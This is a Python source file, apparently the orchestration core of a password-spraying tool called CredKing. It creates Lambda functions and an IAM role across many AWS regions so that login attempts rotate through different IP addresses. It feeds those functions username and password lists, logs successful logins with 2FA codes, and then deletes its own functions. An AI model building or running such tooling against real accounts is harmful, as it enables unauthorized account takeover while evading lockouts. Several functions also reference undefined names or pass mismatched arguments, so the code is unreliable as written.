#!/usr/bin/python3
from concurrent.futures import ThreadPoolExecutor
from zipfile import *
from operator import itemgetter
from threading import Lock, Thread
import json, sys, random, string, ntpath, time, os, datetime, queue, shutil
import boto3, argparse, importlib
from credking_core import log_entry

credentials = {'accounts': []}
lambda_clients = {}
global_arns = {}
regions = [
    'us-east-2', 'us-east-1', 'us-west-1', 'us-west-2', 'eu-west-3',
    'ap-northeast-1', 'ap-northeast-2', 'ap-south-1',
    'ap-southeast-1', 'ap-southeast-2', 'ca-central-1',
    'eu-central-1', 'eu-west-1', 'eu-west-2', 'sa-east-1',
]

lock = Lock()

threads = []


def start_spray(access_key, secret_access_key, arn, args, item):
    if item is None:
        return

    payload = {}
    payload['username'] = item['username']
    payload['password'] = item['password']
    payload['useragent'] = item['useragent']
    payload['args'] = args

    invoke_lambda(
        access_key=access_key,
        secret_access_key=secret_access_key,
        arn=arn,
        payload=payload,
    )


def load_zips(thread_count):
    if thread_count > len(regions):
        thread_count = len(regions)

    use_regions = []
    for r in range(0, thread_count):
        use_regions.append(regions[r])

    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        for region in use_regions:
            zip_list.add(
                executor.submit(
                    create_zip,
                    plugin=plugin,
                    region=region,
                )
            )


def load_lambdas(access_key, secret_access_key, thread_count, zip_path):
    threads = thread_count

    if thread_count > len(regions):
        threads = len(regions)

    # if threads > len(credentials['accounts']):
    #	threads = len(credentials['accounts'])

    arns = []
    with ThreadPoolExecutor(max_workers=threads) as executor:
        for x in range(0, threads):
            arns.append(
                executor.submit(
                    create_lambda,
                    zip_path=zip_path,
                    access_key=access_key,
                    secret_access_key=secret_access_key,
                    region_idx=x,
                )
            )
    return [x.result() for x in arns]


def generate_random():
    seed = random.getrandbits(32)
    while True:
        yield seed
        seed += 1


def create_zip(plugin):
    plugin_path = 'plugins/{}/'.format(plugin)
    random_name = next(generate_random())
    build_zip = 'build/{}_{}.zip'.format(plugin, random_name)

    with lock:
        log_entry('Creating build deployment for plugin: {}'.format(plugin))
        shutil.make_archive(build_zip[0:-4], 'zip', plugin_path)

    return build_zip


def sorted_arns():
    return sorted(
        global_arns.items(),
        key=itemgetter(1),
        reverse=False
    )


def next_arn():
    if len(global_arns.items()) > 0:
        return sorted_arns()[0][0]


def update_arns(region_name=None):
    dt = datetime.datetime.now()
    if not region_name:
        for k, v in global_arns.items():
            global_arns[k] = dt
    else:
        global_arns[region_name] = dt


def init_client(service_type, access_key, secret_access_key, region_name):
    ck_client = None

    # Reuse Lambda lambda_clients
    if service_type == 'lambda':
        if region_name in lambda_clients.keys():
            return lambda_clients[region_name]

    with lock:
        ck_client = boto3.client(
            service_type,
            aws_access_key_id=access_key,
            aws_secret_access_key=secret_access_key,
            region_name=region_name,
        )

    if service_type == 'lambda':
        lambda_clients[region_name] = ck_client

    return ck_client


def create_role(access_key, secret_access_key, region_name):
    client = init_client('iam', access_key, secret_access_key, region_name)
    lambda_policy = {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Principal": {
                    "Service": "lambda.amazonaws.com"
                },
                "Action": "sts:AssumeRole"
            },
            {
                "Effect": "Allow",
                "Principal": {
                    "Service": "sns.amazonaws.com"
                },
                "Action": "sts:AssumeRole"
            }
        ]
    }

    current_roles = client.list_roles()
    check_roles = current_roles['Roles']
    for current_role in check_roles:
        arn = current_role['Arn']
        role_name = current_role['RoleName']

        if 'CredKing_Role' == role_name:
            return arn

    role_response = client.create_role(RoleName='CredKing_Role',
                                       AssumeRolePolicyDocument=json.dumps(lambda_policy)
                                       )
    role = role_response['Role']
    return role['Arn']


def create_lambda(access_key, secret_access_key, zip_path, region_idx):
    region = regions[region_idx]
    head, tail = ntpath.split(zip_path)
    build_file = tail.split('.')[0]
    plugin_name = build_file.split('_')[0]

    # TODO: Figure out how to do dynamic source in GCP to revert this back
    # handler_name = '{}.lambda_handler'.format(plugin_name)
    handler_name = '{}.lambda_handler'.format('main')
    zip_data = None

    with open(zip_path, 'rb') as fh:
        zip_data = fh.read()

    try:
        role_name = create_role(access_key, secret_access_key, region)
        client = init_client('lambda', access_key, secret_access_key, region)
        response = client.create_function(
            Code={
                'ZipFile': zip_data,
            },
            Description='',
            FunctionName=build_file,
            Handler=handler_name,
            MemorySize=128,
            Publish=True,
            Role=role_name,
            Runtime='python3.7',
            Timeout=8,
            VpcConfig={
            },
        )

        log_entry('Created lambda {} in {}'.format(response['FunctionArn'], region))

        return response['FunctionArn']

    except Exception as ex:
        log_entry('Error creating lambda using {} in {}: {}'.format(zip_path, region, ex))
        return None


def invoke_lambda(access_key, secret_access_key, arn, payload):
    lambdas = []
    arn_parts = arn.split(':')
    region, func = arn_parts[3], arn_parts[-1]
    client = init_client('lambda', access_key, secret_access_key, region)

    payload['region'] = region

    response = client.invoke(
        FunctionName=func,
        InvocationType="RequestResponse",
        Payload=bytearray(json.dumps(payload), 'utf-8')
    )

    return_payload = json.loads(response['Payload'].read().decode("utf-8"))
    user, password = return_payload['username'], return_payload['password']
    code_2fa = return_payload['code']

    if return_payload['success'] == True:
        # clear_credentials(user, password)

        log_entry('(SUCCESS) {} / {} -> Success! (2FA: {})'.format(user, password, code_2fa))
    else:
        log_entry('(FAILED) {} / {} -> Failed.'.format(user, password))


def clean_up(access_key, secret_access_key, only_lambdas=True):
    if not only_lambdas:
        client = init_client('iam', access_key, secret_access_key)
        client.delete_role(RoleName='CredKing_Role')

    for client_name, client in lambda_clients.items():
        log_entry('Cleaning up lambdas in {}...'.format(client.meta.region_name))

        try:
            lambdas_functions = client.list_functions(
                FunctionVersion='ALL',
                MaxItems=1000
            )

            if lambdas_functions:
                for lambda_function in lambdas_functions['Functions']:
                    if not '$LATEST' in lambda_function['FunctionArn']:
                        lambda_name = lambda_function['FunctionName']
                        arn = lambda_function['FunctionArn']
                        try:
                            log_entry('Destroying {} in region: {}'.format(arn, client.meta.region_name))
                            client.delete_function(FunctionName=lambda_name)
                        except:
                            log_entry('Failed to clean-up {} using client region {}'.format(arn, region))
        except:
            log_entry('Failed to connect to client region {}'.format(region))

    filelist = [f for f in os.listdir('build') if f.endswith(".zip")]
    for f in filelist:
        os.remove(os.path.join('build', f))